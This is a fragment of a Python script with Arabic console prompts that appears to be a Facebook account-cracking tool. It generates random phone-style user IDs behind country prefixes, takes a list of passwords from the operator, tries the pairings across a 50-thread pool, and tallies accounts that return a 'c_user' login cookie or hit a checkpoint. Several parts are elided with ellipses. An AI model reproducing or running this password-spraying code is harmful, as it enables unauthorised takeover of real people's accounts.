...
g= datetime.datetime(2023, 10, 3, 23, 00 ,9)
...
def i():
    ...
    jalan(' 964780 , 964770 , 964751 , 96475 , +20 , +968 , +90 , +218 , +967 , +966 , +40 ')

    code = input('\n Choose : ')
    os.system("clear")
    print("لا تكتب اكثر من 50000")
    limit = int(input('.عدد تخمين كم ايدي  :- '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[★] عدد الباسوردات  : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[☆]   اضافه باسورد : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;91m مجموع : '+tl)
        print('')
        print('------------------------')
        for love in user:
            pwx = [love[1:]]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r               %s[%s/%s]  [صحيح: %s]  [سكيور : %s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
